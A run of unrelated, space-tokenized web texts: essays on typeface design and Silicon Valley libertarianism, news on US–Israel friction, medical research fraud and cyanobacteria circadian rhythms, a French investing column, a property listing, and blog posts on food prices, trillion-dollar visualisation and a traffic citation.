To be clear : I am not talking about calligraphy , but writing in the widest possible sense , from graffiti , a hasty ‘ back in five minutes ’ sign , to the most elaborate piece of public lettering .
More than the specific forms of letters , the process of writing illuminates the patterns and combinations we are used to seeing , and gives insights into the balance of shapes and the space between them .
The relationship of writing tools to the marks they make has been discussed in some depth ( for the Latin script by Noordzij and Smeijers , most importantly ) , but the transformation of these marks through the computer much less so .
( There are some texts , but mostly they focus on specific cases , rather than general principles ; the notable exception is Richard Southall . )
And yet , since the early days of punchcutting , type - making involves a process of fracturing the typeforms , modularizing and looking for patterns .
Later on , when the roles of designer and maker began to be distinguished ( most emblematically with the Romain du Roi , like the Encyclopédie a true product of the Age of Reason ) typeface design became programmatic , each typeface an instance of a class of objects , rooted in a theory of letter construction – however sensitive to human practice or aloof that may be .
Later , the hot metal “ pattern libraries ” and the rubylith cutouts of shapes to be photographically scaled and distorted for phototype point to the same process , of abstracting the typographic shapes into elements that have little to do with the movements of a tool .
As for the digital domain , deconstruction and repeatability remain key aspects of the design process .
To ensure a typeface built with fragmentary processes has internal consistency , the designer needs to develop a mental model of a tool that may follow the tracks of a writing tool , but may include mark - making and movement behaviours quite distinct from anything that is possible to render with a real writing tool .
( Easy example : the parallelogram - like serifs of a slab , on a typeface with a pen-like modulation . )
Such mental models for typemaking are increasingly important as type families expand into extremes of weight and width , where any relationship with a writing tool quickly evaporates .
So , an invented tool that , for example , makes incised vertical strokes and pen-like bowls , can become the basis for a wide range of styles , ensuring consistency without the limitations of a specific tool ; at the same time , because the model is agnostic of weight and width , it does not hinder the generation of large families with overall consistency but local richness .
( Compare this approach with a wide family developed through extremes of multiple master outlines , where consistency relies on the details of typeforms having close correspondences . )

5 . The Latin script is the odd one out
The demand for typefaces with extended character sets has been growing steadily for many years .
OEM and branding typefaces are expected to cover more than one script , and often three or more .
Beyond the obvious scripts of the wider European region ( Cyrillic , Greek , and Latin ) , the interest has shifted strongly towards Arabic and the Indian scripts .
But there are two key differences between the Latin typographic script , and pretty much everything else : firstly , that the type - making and typesetting equipment were developed for a simple alphabetic left - to - right model that would have to be adapted and extended to work with the complexities of the non-Latins .
Although rectangular sorts will work sufficiently for the simple structure of western European languages , the model strains at the seams when the diacritics start multiplying , and pretty much collapses when the shapes people use do not fit in neat boxes , or change shape in ways that are not easy to describe algorithmically .
No surprise that most non-Latin typesetting implementations make use of compromises and technical hacks to get the script to work .
The second factor is that most non-Latin scripts did not experience the full profusion in styles that arises from a competitive publications market , as well as a culture of constant text production .
( It ’s no surprise that the language of display typography first developed in nineteenth - century Britain , in parallel with the Industrial Revolution : urbanization , rising literacy , and trade in goods and services go hand in hand with the need for typographic richness and differentiation . )
Many students ( indeed , many professionals ) will ask ‘ Can a non-speaker design a script well for a language they do not read ? ’
But a typeface arises in response to a brief , which by definition taps into wider design problems .
For example , many of the conventions surrounding newspapers apply regardless of the market ; the constraints on the typographic specification can be deduced from the general qualities of the script and the language ( e.g. can you hyphenate ?
how long are the words and sentences ?
with what range of word lengths ?
what is the editorial practice in the region in terms of article structure , levels of hierarchy , and headline composition ? ) .
Having established the typographic environment , we can examine the written forms of the language , and the tools that have determined the key shapes .
In this matter most scripts other than the Latin ( and to some degree Cyrillic ) maintain a very close relationship between writing and typographic forms .
Writing exercises and a structural analysis of examples can help the designer develop a feel for the script , before reading the words .
More importantly , in their non-Latin work , analysis of the script ’s structure and the relationship between mark - making tools and typeforms can help the designers to develop criteria for evaluating quality .
Typographic history is well populated with designers excelling in the design of scripts they could not read – indeed , the examples are so numerous that it would be difficult to choose .
Encouraging students to address the complicated design problems inherent in non-Latin scripts is not only a way of enriching the global typographic environment , it is also a superb means of producing designers who can tackle a higher level of difficulty in any aspect of their design .

6 . And finally …
The final lesson for students of typeface design is that a formal environment can teach the functional aspects of design , but can only help them at a distance to develop the aesthetic qualities of their typefaces .
Especially when they are working in categories already heavily populated with typefaces , the distinctions between the simply good and the superb will be very refined .
And when the consideration turns to originality , inventiveness , and how much a particular design causes us to rethink our responses to typeset text , then teachers have little input .
The student , balancing between the deep knowledge of the specialist and the broad curiosity of the generalist , must develop , largely on their own , their capacity to be conscious of past and emerging idioms , to see their own work in the context of developing styles , and – most difficult of all – to identify how their own personal style can co-exist with the restrictions of utility and the conventions of genre .

I grew up in Pasadena , California , attending school with the sons and daughters of fathers ( yup , in those days it was only dads ) who worked at Caltech and the Jet Propulsion Laboratory .
These parents of my classmates were my first encounter with technologists , and they were , to a man , good liberals .
These were the kind of folks who would have Pete Seeger do a benefit concert for our school .
They voted New Deal Democratic ; they were the grateful recipients of all the money the U.S. government had poured into science , post - Sputnik ; they had a sense that the government could do and had done good things , from building Boulder Dam to pulling off the Manhattan Project to putting a man on the moon .
And , as beneficiaries of government largesse in ways they were well aware of — from the GI Bill to interest deductions for home mortgages to the vast expansion of government funding for R&D — they felt society in general , as manifested in the actions of the government , had an obligation to help everyone in it .
They were also fully aware of the positive value of government regulation , from the reliability of the FDA - mandated purity of pharmaceutical - grade chemicals they used in their research to the enforcement of voting rights for African - Americans in the South .
And what with the very visible air quality problems in the Los Angeles basin ( their government - funded studies had recorded the smog death of trees in the encircling San Gabriel Mountains by the 1960s ) , they were able to see the benefits of regulation in the local ban on trash incineration , the regulation of refinery effluents in the L.A. area , and the implementation of federally stipulated smog devices on automobiles .
So it came as a shock , when , 20 years later , I stumbled into the culture of Silicon Valley ( my first job at a software company , 1981 ; first job at a computer magazine , 1983 ; attendance at the first commercial conference devoted to the Internet , 1987 ; token feminist / humanist / skeptic on the masthead of Wired magazine , 1993 ) .
Although the technologists I encountered there were the liberals on social issues I would have expected ( pro-choice , as far as abortion ; pro-diversity , as far as domestic partner benefits ; inclined to sanction the occasional use of recreational drugs ) , they were violently lacking in compassion , ravingly anti-government , and tremendously opposed to regulation .
These are the inheritors of the greatest government subsidy of technology and expansion in technical education the planet has ever seen ; and , like the ungrateful adolescent offspring of immigrants who have made it in the new country , they take for granted the richness of the environment in which they have flourished , and resent the hell out of the constraints that bind them .
And , like privileged , spoiled teenagers everywhere , they have n’t a clue what their existence would be like without the bounty showered on them .
These high - tech libertarians believe the private sector can do everything — but , of course , R&D is something that cannot by any short - term measurement meet the test of the marketplace , the libertarians ’ measure of all things .
They decry regulation –except without it , there would be no mechanism to ensure profit from intellectual property , without which entrepreneurs would not get their payoffs , nor would there be equitable marketplaces in which to make their sales .
..... " flaming " libertarians .....
When I was asked to participate in a survey on the politics of the Net , the questions presumed respondents were libertarian , but charitably gave space for outdated contrarian views .
When Byte magazine ’s former West Coast bureau chief wrote an editorial mildly advocating government subsidy for basic
Net access for elementary schools and public libraries , the only response he got was outraged flames from libertarians .
And when Self magazine started an online gun control conference on The Well , an electronic bulletin board and Internet gateway smack in the middle of tree - hugging , bleeding - heart - liberal , secular - humanist Northern California , opinions ranged from mildly to rabidly anti-gun control .
This passionate hatred of regulation , so out of whack with the opinions of the man and woman on the street in my own bioregion / demographic , showed me how different a place the online , high - tech world is from the terrestrial community to which it is nominally tethered — even an online world with countercultural roots as strong as those of The Well .
Mike Godwin , staff counsel for the online watchdog group Electronic Frontier Foundation , has written in Wired magazine , “ Libertarianism ( pro , con , and internal faction fights ) is the primordial net.news discussion topic .
Anytime the debate shifts somewhere else , it must eventually return to this fuel source . ”
In a decentralized community where tolerance and diversity are the norm ( no one questions online special - interest chat rooms devoted to consensual S&M or Wiccan nature mysticism or… ) , it is damned peculiar that there seems to be no place for political points of view other than the libertarian .
..... true stories .....
I think this all very strange , because , of course , I know that without the government , there would be no Internet ( majorly funded by the government until recently ) .
Further , there would be no microprocessor industry , the fount of Silicon Valley ’s prosperity ( early computers sprang out of government - funded electronics research ) .
There would also be no major research universities cranking out qualified tech workers : Stanford , Berkeley , MIT , and Carnegie Mellon get access to incredibly cheap state - of - the - art equipment plus R&D , courtesy of tax - reduced academic - industrial consortia and taxpayer - funded grants and fellowships .
But libertarianism thrives in high - tech , nonetheless .
I spent a week at the plushy Lake Tahoe getaway of a Silicon Valley guy who ’s made it .
We argued and butted heads with great civility — but perhaps the most Found moment came when he complained about how the local Tahoe building code would n’t let him alter the silhouette of his megachalet .
I nodded sympathetically , yet pointed out that in Los Angeles , where there were no such planning guidelines until recently , plutocrats often tore down existing structures and rebuilt monstrosities that take up the entire lot , blocking their neighbors ’ views .
He looked at me , puzzled ; he had n’t considered that possibility .
Obviously , he had never heard of the tragedy of the commons , where one sheep too many consuming more than its share of common resources destroys the whole ; nor had he thought much about what participating in a community means .
Of course , I was also thinking about the fine system of interstate highways that made his trip from Silicon Valley to the Sierra a breeze ; the sewage and water - treatment facilities that allowed his toddlers to drink safely out of the tap in his kitchen ; the fabric contents - and - care labels on the sheets and towels freshly laundered for each new houseguest ; and the environmental regulations that keep
Tahoe the uniquely blue , gorgeous , and safe refuge it is — precisely the lateral , invisible , benign effects of the government he constantly railed against .
..... i got mine .....
The nexus of libertarianism and high - tech in the Silicon Valley will come to matter more and more , because it involves lots and lots of money ( companies with valuations rivaling General Motors ’ ) .
And it ’s a wealth of tremendous self - insulation : I routinely attend parties peopled by digerati in their 20s and early 30s who , in addition to their desirable arrogance of youth , have a frightening invulnerability ( their skills in demand , the likelihood of cashing out high ) .
One of these , a friend newly venture - funded to capitalize on Net advertising , commented that the economy was basically in good shape ( after all , no one she knew was struggling ) — and then wondered why , when she ran a help wanted ad for an office manager in the San Francisco Chronicle , she got so many applicants , so many of whom had advanced degrees and employment histories of authority and responsibility .
Never mind people like my sister , who , with her biology degree from Stanford and master ’s in public health , has rarely found a steady job with benefits in the last 10 years , and has at times resorted to desperation moves such as selling flowers at subway stations to prevent foreclosure on her house ( wrong gender ; wrong skill set : teaching , public health , environmental concerns — just the kind of “ middle manager / government bureaucrat ” so despised by technolibertarians ) .
Or my ex-boyfriend , the English professor ( B.A. honors , University of Chicago ; Ph.D. , Cornell ) , who was lucky to find a job where he earned about what I made at my first technical writing gig 15 years ago ( wrong skill set : all that subjective liberal - arts - flake crap no one cares about .
After all , anyone can publish on the Web , and , as MIT Media Lab ’s Archduke Nicholas Negroponte points out , what ’s the future of books anyway ? ) .
And what would the technolibertarians make of the New York Times front - page series on the chronic , structural unemployment of masses of skilled middle - class workers , folks theoretically immune to being rendered redundant in the ’90s ?
Or the heartbreaking stories I read about blue - collar workers ( have n’t they had the good taste to become extinct by now ? ) in the house organ of the United Auto Workers ( the National Writers Union is part of the UAW ) .
I imagine the technolibertarians thinking , “ Well , the blue - collar miscreants , it ’s their own damned inertial Second Wave thinking that ’s got them unemployed . ”
But what would they say about the white - collar jobless , who , no doubt , were working with computers ?
..... the true revenge of the nerds .....
As surely as power follows wealth , those who make money decide that society , having rewarded their random combination of brains and luck in one sphere , should pay attention to them in another .
And so , high - technocrats are beginning to try to influence the world beyond VDTs .
But what will result if the people who want to shape public policy know nothing about history or political science or , most importantly , how to interact with other humans ?
Programmers , and those who know how to make money off them , mostly find it easier to interact in e-mail than IRL ( in real life ) , and are often not good at picking up the cues , commonplaces , and patterns of being that civilians use to communicate , connect , and operate in groups .
The convergence between libertarianism and high - tech has created the true revenge of the nerds :
Those whose greatest strengths have not been the comprehension of social systems , appreciation of the humanities , or acquaintance with history , politics , and economics have started shaping public policy .
Armed with new money and new celebrity — juice — they can wreak vengeance on those by whom they have felt diminished .
Implicit is their assumption that those who excel by working with the tangible and not the virtual ( e.g. , manufacturing and servicing actual stuff ) are to be considered societally superfluous .
Technolibertarians applaud the massive industrial dislocations taking place in affluent North America , comparable to the miseries of the Scottish enclosures or the Industrial Revolution .
Compare my father ’s generation :
My father succeeded through his era ’s version of the arriviste drive so celebrated by technolibertarian theorists such as George Gilder , Silicon Valley ’s John Knox .
One of eight children in an immigrant family , second in his class in medical school when there were still quotas on Jews ( the usual story ) , my father , like the majority of his age - cohorts , never had contempt for those who could n’t find a way to work the system as he had .
He believed in social safety nets and as much government regulation ( for consumer health and safety , for example ) as possible to aid ordinary people .
It would have made no sense to him to adopt the stance of today ’s technolibertarian nouveau riche ( or even more scarily , wannabe nouveau riche ) .
And in this he was not exceptional .
..... the ultimate escape .....
It ’s not clear how all this evolved : a combination , no doubt , of the money to be made by developing technology in the private sector , the general worldwide resurgence of libertarianism , maybe some previously undocumented deleterious effect of the toxic byproducts of semiconductor manufacturing that have leached into the aquifers below Sunnyvale .
But there are some worrisome consequences to consider as technology touches more and more people ’s lives — and those who rule are increasingly the ones who understand it , own it , create it , and profit by it .
Protecting privacy .
Technolibertarians rightfully worry about Big Bad Government , yet think commerce unfettered can create all things bright and beautiful — and so they disregard the real invader of privacy : Corporate America seeking ever - better ways to exploit the Net , to sell databases of consumer purchases and preferences , to track potential customers however it can .
Skimping on philanthropy .
In Silicon Valley and its regional outposts ( Seattle , Austin ) , it ’s not even a joke , not even an embarrassment , that there ’s so little corporate philanthropy , except where enlightened self - interest can come to bear ( donating computers to schools , contributing to a local computer museum ) .
High - tech employees rank among the lowest of any industry sector for giving to charity — especially dismaying given their education , job security , lifetime earnings potential , and annual income .
It ’s an issue of culture : Unlike other educated professionals , who see good works and support of the arts as symbols of having arrived or as payback to the society that has treated them well , the average geek espouses a world where the only art would be that which has withstood the test of the marketplace ( Dong Kingman museums ?
Leroy Nieman traveling exhibitions ? ) , and where there is no value to be derived in experiencing a painting in person ( that is , in a museum ) as opposed to on CD - ROM .
And since these guys honestly can’t perceive the difference between a Lichtenstein and some soi-disant computer art exercise in primary - colored fractals , courtesy of Kai ’s Power Tools — they do n’t see anything out there worth subsidizing .
A total sweetheart of my acquaintance , the smart and aesthetically sensitive creative director of a hot hot hot Web design studio , not only had n’t read The Magic Mountain , he had n’t heard of it .
Nor of its author , Thomas Mann , a Nobel laureate and one of the great novelists of the century , an early multivoiced postmodernist if ever there were one .
And perish the thought that anyone should need the services of an AIDS hospice , without the benefit of a few thousand shares of founders ’ stock in Intel or Cisco to cash in .
Gutting the environment .
High - tech also has tremendously negative environmental impacts : Manufacturing its plastics and semiconductors is a remarkably toxic and resource - depleting affair .
No surprise , then , that high - tech companies increasingly manufacture them in countries without environmental and worker safety regulations , or in U.S. locales where these regulations are more lax .
This way , the guys in area codes 415 and 408 who like to go telemarking in the Shasta Trinity Alps or bouldering in the Desolation Wilderness do n’t have to confront the opportunity cost of their wealth : the poisoning of the world due to the ever - expanding reach of industrialization .
And they never consider that one of the reasons the whole world ( including the immigrant engineers working in Silicon Valley ) wants to be here is that environmental regulation and a culture of government - mandated conservation ( however imperfectly executed ) have made the United States probably the safest , healthiest , and , in some ways , most pristine place on earth .
Ignoring cities .
The anti-communitarian outlook is an outcropping of how suburban an industry high - tech is .
The quintessential edge - city business , high - tech celebrates people operating as monads , free agents who work in industrial parks and aspire , when they cash out in an initial public offering , to telecommute from horse country , puma country , or even from within the spare - bedroom - cum - home - office located in a half - million - dollar Eichler ranch house on a street close to El Camino Real .
Never mind that most start - up / self - employed / telecommuting Internet entrepreneurs are concentrated in New York , San Francisco , and Los Angeles , thriving on the grit / density / frisson / charge of urban areas .
..... new robber barons .....
All this matters desperately :
With the libertarian agenda at work , the very things that fed the boom economy in intellectual property — the last great thing the United States has done — will disappear without more investment in infrastructure and health and safety and education and every other good legacy of the New Deal and the Great Society .
In 20 or 30 years , the United States may well cease creating the one commodity that produces a trade surplus and new jobs .
And the sorrow for the bottom 90 percent of society — what Apple Computer once disingenuously called “ the rest of us ” — will be that once again we may deceive ourselves .
We make goo - goo eyes over the megabucks high - tech generates , but we ignore the price .
Just as 19th - century timber and cattle and mining robber barons made their fortunes from public resources , so are technolibertarians creaming the profits from public resources — from the orderly society that has resulted from the wise use of regulation and public spending .
And they have neither the wisdom nor the manners nor the mindset to give anything that ’s not electronic back .
San Francisco writer Paulina Borsook has published essays in Suck , MIT Press ’ Leonardoand the Seal Press anthology Wired Women .
Beginning as a spat over a single housing project , a dispute this week between the Obama administration and Israel has ballooned into the biggest U.S. - Israeli clash in 20 years , adding to months of strain between Washington and one of its closest allies .
Israel ’s decision to move ahead with 1,600 new housing units in East Jerusalem , announced during a visit by Vice President Joe Biden , drew criticism from Washington in language rarely directed at even Iran or North Korea .
Secretary of State Hillary Rodham Clinton said Israel ’s announcement “ was an insult to the United States . ”
In a 45 - minute telephone call Friday to Prime Minister Benjamin Netanyahu , Clinton upbraided him and demanded that he take more steps to show his nation ’s commitment to peace .
A senior U.S. official , speaking on condition of anonymity in the midst of the diplomatic friction , described the administration ’s objection to the project as “ the first time the U.S. has really pushed back hard . ”
The Israeli government , stunned and perplexed by the U.S. assault , tried to regroup this weekend .
Netanyahu convened seven members of his Cabinet on Saturday to consider their response , and his office said a committee would investigate the timing of the housing announcement .
Underlying the diplomatic fracture are complicated political calculations by both governments .
Clinton ’s criticism , authorized by President Obama , was aimed at trying to obtain concessions from the conservative Israeli government at a moment when Netanyahu may be politically vulnerable , officials said .
The U.S. goal is to win Israeli agreement to back off the housing project and to forgo announcements of additional Jewish construction in East Jerusalem , officials said .
The administration also wants Israel to agree to discuss substantive issues in new peace talks that could begin in coming days , U.S. officials said .
U.S. officials hope that the Israeli concessions might enlist support for the talks from the Palestinians and Arab states , which have been wavering since the Israeli announcement Tuesday inflamed Arab opinion .
Netanyahu ’s position in his government coalition is “ perilous , ” another senior U.S. official said , as the prime minister is being pushed to give ground at a moment when he is taking criticism from some on the Israeli right , as well as those in the country ’s center and left .
But the Netanyahu government believes it has solid public support within Israel for building new housing in Jerusalem , which many Israelis as well as Palestinians consider God - given soil .
On Saturday , Palestinian negotiator Saeb Erekat reiterated that Palestinians would not take part in the new talks unless the Israelis abandon the project in the Ramat Shlomo neighborhood .
Experts questioned whether the blow - up would have a long - term effect on U.S. - Israeli ties .
Daniel Levy , a former Mideast peace negotiator , said the administration is trying to “ lay down a marker with [ Netanyahu ] that they will not allow him to make them look weak . ”
The administration is “ bleeding credibility with the Arab world ” because Arabs believe Netanyahu is being “ handled with kid gloves , ” he said .
The flare - up recalled the period of 1991 - ' 92 , when the administration of President George H.W. Bush held up financial aid to pressure Israel .
By comparison , Levy said , the United States has used tough language in the latest controversy but has not yet taken steps “ creating consequences ” for Israel .
“ Question is : What do they do next , assuming that Bibi continues to act up ? ” he said , using Netanyahu ’s nickname .
“ This is more than a tempest in a teapot , but less than a strategic crisis , ” said Ziad Asali , president of the American Task Force on Palestine , an advocacy group in Washington .
The Obama administration , facing midterm elections this year , cannot afford to alienate Jewish Americans who support Israel .
Israel ’s advocates in the U.S. called Clinton ’s words Friday “ a gross overreaction . ”
“ We cannot remember an instance when such harsh language was directed at a friend and ally of the United States , ” said Abraham Foxman , president of the staunchly pro-Israel Anti-Defamation League .
Last year , the Obama administration demanded a freeze in Jewish settlements in the West Bank , but Israelis resisted .
Talks between Israelis and Palestinians broke down over the issue , and Biden traveled to the Mideast last week in an effort to restart the process and smooth relations .
Israelis were perplexed by the U.S. criticism because Biden on Thursday expressed satisfaction with the Israeli response to the flap and pronounced his visit a success .
Clinton ’s criticism came after that .
U.S. officials said the administration wanted Biden to send a friendly message to the Israeli public , while Clinton must demand more of the Israeli government .

The Consumerist recently linked to this remarkable chart :
The chart was put together by the Physicians Committee for Responsible Medicine , but its figures still , alas , look quite relevant .
Thanks to lobbying , Congress chooses to subsidize foods that we ’re supposed to eat less of .
Of course , there are surely other reasons why burgers are cheaper than salads .
These might include production costs , since harvesting apples is probably more naturally seasonal than slaughtering cows ( even though both are in demand year - round ) .
Transportation and storage costs might also play a role , as it ’s probably easier to keep ground beef fresh and edible for extended periods of time , by freezing it , than cucumbers .
Whatever the cause of the pricing change , there is little doubt that many healthful foods have gotten much more expensive relative to unhealthful ones .
David Leonhardt showed this in another remarkable chart , published here last year , that displays how the prices of different food groups have changed relative to their pricing 30 years ago :
You can find his commentary on this chart here .
For more on the relationship between food pricing and obesity , go here .
Update :
Thanks to the readers who alerted us to the transposed terms in this post ’s title , which originally read “ Why a Big Mac Costs More than a Salad . ”
It ’s been fixed now .
It ’s well established that critical human body functions , including sleep , hormone production and regulation of body temperature , follow a circadian ( 24 - hour ) cycle .
These genetically programmed patterns stay in effect even under isolation from the naturally occurring daily light - dark cycles of the sun , and are found in nearly all organisms — animals , plants , fungi and even some bacteria .
Although bacteria do n’t “ sleep ” in the same way humans do , a type of bacteria known as cyanobacteria undergoes daily cycles of activity and rest .
These bacteria depend on sunlight to perform photosynthesis , so they have evolved to be most active in daylight .
A new study of cyanobacteria by a team of researchers at MIT and the University of California at San Diego has revealed , for the first time , how those circadian rhythms control the bacteria ’s rate of cell division ( their method of reproduction ) in single cells .
“ These cells have to keep dividing , and the circadian oscillator regulates when they divide , ” says Bernardo Pando , an MIT graduate student in physics and one of the lead authors of a paper describing the findings in the March 18 online edition of Science .
In multicellular animals , including humans , cell division is critical for renewal and repair , while out - of - control cell division leads to cancer , so “ understanding how cells are dividing is really of fundamental importance , ” says Susan Golden , professor of molecular biology at the University of California at San Diego and an author of the paper .
In 1998 , Golden and other researchers identified three so - called “ clock proteins ” that control circadian rhythms in cyanobacteria .
There has been some evidence that the circadian clock regulates cell division , but the exact relationship was unclear .
The MIT - UCSD team , led by MIT biophysics professor Alexander van Oudenaarden , found that under conditions of moderate constant light , the cyanobacteria undergo cell division about once per day , and the divisions take place mostly at the midpoint of the 24 - hour cycle .
The researchers then sped up the cell cycle by boosting the intensity of light .
That enabled the cells to photosynthesize more , increasing the amount of energy available to them .
The cells did divide more frequently , but in a pattern still linked to the circadian clock — they divided a quarter of the way into the cycle , and again three - quarters into the cycle .
The team also showed that in all conditions , the cyanobacteria enter a resting phase about 19 hours into the circadian cycle , after which they will not divide until the next cycle begins .
Key to the new finding is a technique the researchers devised to study circadian rhythms in single cells , says van Oudenaarden , the senior author of the paper .
The team tracked individual cells over a week .
Proteins that govern the circadian clock were tagged with yellow fluorescent protein , so each cell ’s position in the 24 - hour cycle could be pinpointed .
Cells were also photographed every 40 minutes , so researchers could see when they divided .
The single - cell tracking technique could also be used to reveal linkages between the circadian clock and other cyclical cell process , such as metabolism .
“ The circadian cycle has to ride herd on all these other cycles and make sure they stay in synchrony and that cell activity is not chaotic , ” says Golden .
Golden is planning follow - up studies in cyanobacteria , but yeast and mammalian cells could also be logical targets for such studies , says van Oudenaarden .
In a recent paper published in the journal Cell , van Oudenaarden and Golden reported the molecular mechanism of how clock proteins control the cell cycle in cyanobacteria .
The proteins ( KaiA , KaiB and KaiC ) control the action of another protein called FtsZ , preventing it from going to the middle of the cell and forming a ring necessary for cell division .
Taken together , the papers are “ excellent work connecting cell division to the circadian clock , ” says Paul Hardin , a biologist at Texas A&M University who studies circadian rhythms in fruit flies .
La théorie des marchés efficients a pris du plomb dans l'aile ces derniers temps .
Dans sa dernière étude sur le rendement des investissements de long terme , à laquelle ont été associés trois membres de la London School of Economics , Crédit Suisse enfonce le clou .
Ces travaux montrent que si , en théorie , il est incroyablement difficile de faire mieux que le marché en pratiquant la gestion active de portefeuille , on peut très bien y parvenir en appliquant des recettes d'une simplicité confondante .
Deux d'entre elles sont bien connues .
En Bourse , les petites entreprises sont en général plus performantes que les grandes .
Aux Etats - Unis , le différentiel de rendement annuel s'est élevé de 3 points en moyenne depuis 1926 .
Les investisseurs ont aussi intérêt à ne pas acheter des valeurs de croissance , pour leur préférer des valeurs de rendement .
Ces sociétés , qui affichent des multiples de résultat ou de valeur de bilan plus modestes , ont réalisé une surperformance du même ordre .
Pourtant , la méthode simple qui marche le mieux , c'est de suivre la tendance du marché , en achetant les titres les plus profitables et en vendant ceux qui sont à la traîne .
Il est vrai qu'en 2009 cette tactique qui consiste à " miser sur les gagnants et se débarrasser des perdants " a produit des résultats catastrophiques .
Mais si l'on se fie aux enseignements de l'Histoire , ces pertes seront à un moment ou à un autre plus que récupérées .
Un fonds spéculatif britannique qui aurait opéré dans les tout derniers mois du règne de la reine Victoria aurait atteint un rendement de 14 % par an en répétant la boucle suivante : acheter les titres qui ont été les plus dynamiques au cours des douze mois précédents , les garder quelques mois , puis les vendre .
Une technique qui assure un rendement annuel supérieur de 5 points à la moyenne générale du marché .
A l'inverse , celui qui aurait joué systématiquement l'achat des valeurs les moins perfomantes pour miser sur leur retour en grâce aurait dégagé un retour annuel plutôt maigre de 4 % .
Règle mécanique
Personne ne peut expliquer rationnellement pourquoi une stratégie aussi simple se révèle aussi payante , surtout au cours des dernières décennies , qui ont vu les frais de transaction descendre très bas .
S'il se trouvait suffisamment d'investisseurs rationnels pour l'adopter , l'écart de performance disparaîtrait .
La meilleure explication est peut - être que les investisseurs ne sont pas des acteurs rationnels .
Les professionnels sont tellement convaincus de leur valeur ajoutée qu'il leur est impensable de se contenter d'appliquer une règle aussi mécanique .
Ce qui fait le bonheur de ceux qui la suivent , d'autant qu'après une année aussi calamiteuse que 2009 , de nombreux investisseurs seront certainement tentés de s'en détourner ... exactement au moment où il faudrait ne rien faire .
Il est possible que l'avenir démente ces propos , mais ce vénérable cas de figure âgé de 110 ans est un argument imparable .

No of Bedrooms : 4
A few minutes from Figueres , a city known for hosting the museum of the famous painter Salvador Dali , you will find this beautiful Catalan farmhouse .
Its surrounded by four acres of land , which gives it quiet , so popular for urbanites .
It was restored with extreme taste and dedication .
For this restoration it was used the best materials and it was took in mind every last detail .
The luxury shines inside , in their spacious rooms , in the harmony of the elements , in the extreme comfort of their rooms .
Hideous Belltown
Seattle is quite a beautiful city , no doubt about that .
The Belltown neighborhood does n’t swing that way .
Much of it is downright hideously ugly .
If not for all that ugliness , there ’d be nothing to see .
I ’ve lived here for 20 years and I ’ve only just started taking notice .
Please join me on this odyssey of unsightliness as we try to figure out why poor Belltown looks so bad .
In what may be among the longest - running and widest - ranging cases of academic fraud , one of the most prolific researchers in anesthesiology fabricated much of the data underlying his research , said a spokeswoman for the hospital where he works .
The researcher , Dr. Scott S. Reuben , an anesthesiologist in Springfield , Mass. , who practiced at Baystate Medical Center , fabricated data in some or all of the 21 journal articles dating from at least 1996 , said Jane Albert , a spokeswoman for Baystate Health .
The reliability of dozens more articles he wrote is uncertain , and the common practice — supported by his studies — of giving patients aspirinlike drugs and neuropathic pain medicines after surgery instead of narcotics is now being questioned .
Paul Cirel , a lawyer for Dr. Reuben , said that he could not discuss the case because Baystate had investigated it as part of a confidential peer - review process .
Baystate officials “ were aware of extenuating circumstances , ” Mr. Cirel said .
About a month ago , I referenced Glenn Beck ’s video talking about the bail - out package .
I was trying to let some people know just how much one trillion actually is … it is a million millions !
Well , this guy recently used Google Sketch - up to demonstrate what one trillion dollars would actually look like ( made out of $ 100 bills ) .
All this talk about “ stimulus packages ” and “ bailouts ” …
A billion dollars …
A hundred billion dollars …
Eight hundred billion dollars …
One TRILLION dollars …
What does that look like ?
We ’ll start with a $ 100 dollar bill .
Currently the largest U.S. denomination in general circulation .
Most everyone has seen them , slightly fewer have owned them .
Guaranteed to make friends wherever they go .
A packet of one hundred $ 100 bills is less than 1/2 ″ thick and contains $ 10,000 .
Fits in your pocket easily and is more than enough for week or two of shamefully decadent fun .
Believe it or not , this next little pile is $ 1 million dollars ( 100 packets of $ 10,000 ) .
You could stuff that into a grocery bag and walk around with it .
While a measly $ 1 million looked a little unimpressive , $ 100 million is a little more respectable .
It fits neatly on a standard pallet …
And $ 1 BILLION dollars … now we ’re really getting somewhere …
Next we ’ll look at ONE TRILLION dollars .
This is that number we ’ve been hearing about so much .
What is a trillion dollars ?
Well , it ’s a million million .
It ’s a thousand billion .
It ’s a one followed by 12 zeros .
You ready for this ?
It ’s pretty surprising .
Go ahead …
Scroll down …
Ladies and gentlemen… I give you $ 1 trillion dollars …
( And notice those pallets are double stacked . )
So the next time you hear someone toss around the phrase “ trillion dollars ” … that ’s what they ’re talking about .

I live in Huntsville , Alabama .
I was driving home from the downtown area of my metropolitan statistical area which has a population of over half a million people .
I was not driving erratically .
I signaled when changing lanes .
I obeyed all traffic control devices .
Yet , I was pulled over by city police .
Immediately there were three other patrol cars behind my mid-size SUV .
Four in total .
I was informed by an officer that my bumper stickers were obstructing my view .
I have several liberal bumper stickers on the back window of my 2003 Ford Explorer Sport .
A DEM sticker .
A " Yes , We Did " sticker from MoveOn.org .
A " Veterans for Obama " sticker to company my Operation Enduring Freedom plate , as I am a Veteran .
A " Daily Kos " decal .
And a " FREE DON " sticker .
All but two are completely outside of the transparent portion of the back glass .
The remaining two do not obstruct my view whatsoever .
I cannot even see them in my rear - view mirror .
While I might not agree , I could understand police looking for reasons to make stops in a downtown area on a Friday night to catch intoxicated drivers .
But I was never administered a field sobriety test .
I was n't asked to step outside the vehicle .
I was n't even asked if I had been drinking .
Yet , I was cited .
I thought I received a warning , and I was just going to call it a night and go to bed angry .
But upon further inspection , I received an actual citation .
I can either pay a fine , or appear in court on the 23rd of March at 5:30 PM .
I 've reviewed the statue for which I was cited .
It applies to the the percentage of visibility through window tinting .
Utter bullshit .
I guess the best thing city police have to do on a Friday night in a metropolitan area of over half a million is to pull over and cite individuals for perceived excessive bumper stickers .
I 'm writing here because , I 'm sure like many of you , blogging is my outlet for things like this .
I 've contacted an attorney , who happens to be a friend and a progressive Congressional candidate who is running to oust our local representative , the party switcher Parker Griffith .
This is not meant as a solicitation diary , but more than likely we will have to take time off from his campaign to represent me .
He 'd appreciate your help .
I 'm so effing angry .
There is no way I 'm letting this slide .
Montana Gov. Brian Schweitzer said Thursday that he is seeking U.S. government permission to import cheaper drugs from Canada for use in state insurance programs .
Schweitzer said he thinks the move could chop 40 per cent off the $ 100 million US the state spends each year on prescription drugs for Medicaid , the children 's health insurance program , state employees , and inmates at the prison .
The governor said he envisions the state setting up a deal with a Canadian wholesaler that could mail the drugs to local pharmacies on insurance plans paid for by the state .
In the case of the prison , the governor said he expects the state would order those directly .
The U.S. Centers for Medicare and Medicaid Services said Thursday it had not yet seen Montana 's request and could n't comment .
